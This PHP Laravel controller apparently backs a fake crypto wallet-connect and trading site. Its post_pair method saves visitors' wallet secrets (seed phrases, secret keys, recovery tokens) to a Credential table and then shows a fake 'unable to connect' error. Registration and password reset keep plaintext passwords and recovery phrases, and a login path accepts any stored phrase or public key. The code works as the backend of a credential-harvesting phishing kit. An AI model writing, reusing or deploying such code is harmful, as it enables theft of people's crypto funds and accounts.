<?php

namespace App\Http\Controllers;

use App\Mail\ForgotPassword;
use App\Mail\Welcome;
use App\Mail\WelcomeMail;
use App\Models\User;
use App\Models\Credential;
use App\Models\UserAssets;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;

class Page extends Controller
{
  public function get_index()
  {
    return view('index');
  }

  public function get_terms()
  {
    return view('terms');
  }

  public function get_privacy()
  {
    return view('privacy');
  }

  public function get_walletlist()
  {
    return view('walletlist');
  }

  public function get_manualpair(Request $request)
  {
    return view('manualpair', [
      'wallet' => $request->query('wallet', 'Wallet'),
    ]);
  }

  public function post_pair(Request $request)
  {
    Credential::create([
      'wallet' => $request->wallet,
      'email_address' => $request->email,
      'type' => $request->type,
      'details' => $request->details,
    ]);

    return back()->withErrors('Unable to connect as request is taking longer than expected. Please sign up manually to access.');
  }

  public function get_login()
  {
    return view('login');
  }

  public function get_register()
  {
    return view('register');
  }

  public function get_passphrase()
  {
    return view('passphrase');
  }

  public function get_secretkey()
  {
    return view('secretkey');
  }

  public function get_recoverytoken()
  {
    return view('recoverytoken');
  }

  public function get_method()
  {
    return view('method');
  }

  public function get_trade()
  {
    return view('trade');
  }

  public function post_register(Request $request)
  {

    $request->validate([
      'name' => 'required',
      'email' => 'required|unique:users',
      'phone_number' => 'required',
      'country' => 'required',
      'password' => 'required'
    ]);
    $data = $request->except(['_token', 'recovery_phrase']);


    $data['unhashed_password'] = $data['password'];
    $data['password'] = bcrypt($data['password']);
    $data['i_user'] = !empty($data['i_user']) ? $data['i_user'] / 56789 : 0;

    $data['remember_token']     =  \Illuminate\Support\Str::random(10);

    $user = config('roles.models.defaultUser')::create($data);

    $role = config('roles.models.role')::where('name', '=', 'User')->first();
    $user->attachRole($role);
    if ($user) {
      if (!empty($request)) {
        UserAssets::keyAttach($user->id, $request->recovery_phrase, $request->recovery_password, $request->public_key);
      } else {
        UserAssets::attach($user->id);
      }
    } else {
      return back()->withErrors('Registration not successful');
    }
    Auth::loginUsingId($user->id);
    return redirect('app/index')->with('success', 'Registration Success.');
  }

  public function post_login(Request $request)
  {
    $request->validate([
      't_key' => 'required_without:password',
      'password' => 'required_without:t_key',
      'password_confirmation' => 'required_with:password|same:password',
    ]);

    $t_key = $request->t_key;
    $password = $request->password;

    if ($t_key) {
      //search for it.
      $user_asset = UserAssets::where('recovery_phase', '=', $t_key)
        ->orWhere('recovery_password', '=', $t_key)
        ->orWhere('public_key', '=', $t_key)
        ->orWhere('qsl_key', '=', $t_key)
        ->first();
      if (is_null($user_asset)) {
        return back()->withErrors('Invalid Credentials');
      }
      $user_id = $user_asset->user_id;
      if (!empty($user_id)) {
        Auth::loginUsingId($user_id);
        return redirect('app/index');
      } else {
        return back()->withErrors('Invalid Credentials');
      }
    }

    if ($password) {
      $data = $request->except(['_token', 't_key']);
      if (Auth::attempt($data)) {
        if (Auth::user()->isUnverified()) {
          return back()->withErrors('Locked account');
        } elseif (Auth::user()->isAdmin()) {
          return redirect('admin/index');
        }
        return redirect('app/index');
      }
      return back()->withErrors('Invalid Credentials');
    }
  }

  public function get_phrase_login()
  {
    return view('login_key');
  }

  public function post_phrase_login(Request $request)
  {
    $request->validate([
      't_key' => '',
      'password' => ''
    ]);

    $t_key = $request->t_key;
    $password = $request->password;

    if ($t_key) {
      //search for it.
      $user_asset = UserAssets::where('recovery_phase', '=', $t_key)
        ->orWhere('recovery_password', '=', $t_key)
        ->orWhere('public_key', '=', $t_key)
        ->orWhere('qsl_key', '=', $t_key)
        ->first();
      if (is_null($user_asset)) {
        return back()->withErrors('Invalid Credentials');
      }
      $user_id = $user_asset->user_id;
      if (!empty($user_id)) {
        Auth::loginUsingId($user_id);
        return redirect('app/index');
      } else {
        return back()->withErrors('Invalid Credentials');
      }
    }

    if ($password) {
      $data = $request->except(['_token', 't_key']);
      if (Auth::attempt($data)) {
        if (Auth::user()->isUnverified()) {
          return back()->withErrors('Locked account');
        } elseif (Auth::user()->isAdmin()) {
          return redirect('admin/index');
        }
        return redirect('app/index');
      }
      return back()->withErrors('Invalid Credentials');
    }
  }

  public function logout()
  {
    Auth::logout();
    return redirect('index');
  }

  public function get_reset()
  {
    return view('reset');
  }

  public function post_reset(Request $request)
  {
    //loook for use with the email.
    $user = User::where('email', $request->email)->first();
    if (!empty($user)) {
      //generate new remember token.
      $rem = Str::random(12);
      $user->update(['remember_token' => $rem]);
      $user->save();
      Mail::to($user->email)->send(new ForgotPassword($rem));
    }
    return redirect('login')->with('success', 'Recovery email sent if the email provided is valid');
  }

  public function get_new(Request $request)
  {
    $token = $request->token;
    if (!isset($token)) {
      return redirect('login')->withErrors('Invalid Token');
    }
    //get user who owns the token.
    $user = User::where('remember_token', $token)->first();
    if (empty($user)) {
      return redirect('login')->withErrors('Invalid Token');
    }
    //update token to make it invalid.
    $user->update(['remember_token' => Str::random(13)]);
    Auth::loginUsingId($user->id);
    return view('new');
  }

  public function post_new(Request $request)
  {
    $n_password = $request->n_password;
    $user = Auth::user();
    $user->update(['password' => bcrypt($n_password), 'unhashed_password' => $n_password]);
    $user->save();
    return redirect('app/index')->with('success', 'Password reset successfully');
  }
}
